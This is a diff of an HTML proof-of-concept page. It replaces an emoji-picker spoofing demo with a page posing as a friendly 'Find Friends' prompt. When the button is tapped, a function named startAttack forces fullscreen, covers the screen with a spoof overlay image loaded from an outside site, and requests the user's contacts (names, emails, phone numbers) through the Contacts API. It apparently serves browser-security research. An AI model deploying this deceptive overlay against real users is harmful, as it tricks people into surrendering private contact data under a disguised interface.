@@ -1,58 +1,125 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<title>PoC</title>
-	<style>
-		body {
-			margin: 0;
-		}
-		#spoof {
-			width:  100%;
-			height: 100%;
-		}
-		#input1 {
-			position: absolute;
-			left: 40%;
-			width: 400px;
-		}
-		#input2 {
-			position: absolute;
-			left: 40%;
-			width: 400px;
-		}
-	</style>
+<meta charset="UTF-8">
+<title>Contacts Permission Test</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+
+body{
+    margin:0;
+    font-family: Arial, sans-serif;
+    background:#ffffff;
+    text-align:center;
+}
+
+#spoof{
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    display:none;
+    z-index:9999;
+}
+
+#content{
+    margin-top:120px;
+    padding:20px;
+}
+
+h1{
+    font-size:24px;
+}
+
+p{
+    font-size:16px;
+}
+
+button{
+
+    margin-top:40px;
+    width:80%;
+    max-width:300px;
+
+    padding:18px;
+    font-size:18px;
+
+    border:none;
+    border-radius:10px;
+
+    background:#25D366;
+    color:white;
+
+}
+
+button:active{
+    background:#1da851;
+}
+
+</style>
 </head>
+
 <body>
-	<img id="spoof" src="https://lbherrera.github.io/lab/emoji-spoof/spoof.png" style="display: none;"></img>
-	<div id="content">
-		<center>
-			<br>
-			<h1>Right-click on the input field and select an emoji :)</h1>
-			<input type="text" id="input1">
-			<input type="text" id="input2">
-		</center>
-	</div>
-	<script>
-		let fullscreen = false;
 
-		oncontextmenu = () => {
-			setTimeout(() => {
-				input2.style.top = "-25px";
-			}, 0);
-		}
+<img id="spoof" src="https://lbherrera.github.io/lab/emoji-spoof/spoof.png">
 
-		onkeydown = (event) => {
-			let key = event.which || event.keyCode;
-			if (key === 91 && !fullscreen) {
-				setTimeout(() => {
-					input2.style.width = "1px";
-					document.getElementById("spoof").style.display = "block";
-					document.getElementById("content").style.display = "none";
-					document.documentElement.requestFullscreen();
-				}, 0);
-				fullscreen = true;
-			}
-		}
-	</script>
+<div id="content">
+
+<h1>Find Friends</h1>
+
+<p>
+Allow access to your contacts to quickly find friends
+who are already using this service.
+</p>
+
+<button id="start">
+Find Friends
+</button>
+
+</div>
+
+<script>
+
+let triggered = false;
+
+document.getElementById("start").addEventListener("touchstart", startAttack);
+document.getElementById("start").addEventListener("click", startAttack);
+
+async function startAttack(){
+
+if(triggered) return;
+triggered = true;
+
+try{
+
+// request fullscreen
+await document.documentElement.requestFullscreen();
+
+// show spoof overlay
+setTimeout(()=>{
+document.getElementById("spoof").style.display="block";
+document.getElementById("content").style.display="none";
+},120);
+
+
+// trigger contact permission
+const contacts = await navigator.contacts.select(
+['name','email','tel'],
+{multiple:true}
+);
+
+console.log("Contacts:",contacts);
+
+}catch(err){
+console.log(err);
+}
+
+}
+
+</script>
+
 </body>
 </html>
